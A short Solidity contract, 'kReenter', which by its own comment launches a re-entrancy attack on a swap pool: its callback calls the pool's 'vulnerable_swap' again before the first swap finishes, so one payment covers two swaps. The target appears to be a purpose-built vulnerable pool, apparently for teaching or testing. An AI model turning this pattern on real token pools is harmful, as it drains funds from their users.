// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "contracts/IkSwap.sol";
import "contracts/IERC20.sol";

//Lauches a basic Re-entrancy Attack on a pool with unlocked swap function
contract kReenter is IkSwapSwapCallback {
   
    function kSwapCallback(int256 _amount0Delta, int256 _amount1Delta, bytes calldata data) external {
            
        IkSwapPool p = IkSwapPool(msg.sender);
        (bool reenter, address from,bool zeroForOne,uint256 amountIn) = abi.decode(data, (bool,address,bool,uint256));
        if (reenter) { 
            //resend the same swap a 2nd time before the first one completes
            p.vulnerable_swap(from, zeroForOne, amountIn, abi.encode(false,from,zeroForOne,amountIn));
        } else {
            //send the payment
            if (_amount0Delta > 0) {
                IERC20(p.token0()).transferFrom(from, address(p), uint256(_amount0Delta));
            } else {
                IERC20(p.token1()).transferFrom(from, address(p), uint256(_amount1Delta));
            }
        }

    }


    function swap(address _pool, bool zeroForOne, uint256 amountIn) external returns (uint256) {

    
        return IkSwapPool(_pool).vulnerable_swap(msg.sender, zeroForOne, amountIn, abi.encode(true,msg.sender,zeroForOne,amountIn));
    }
}
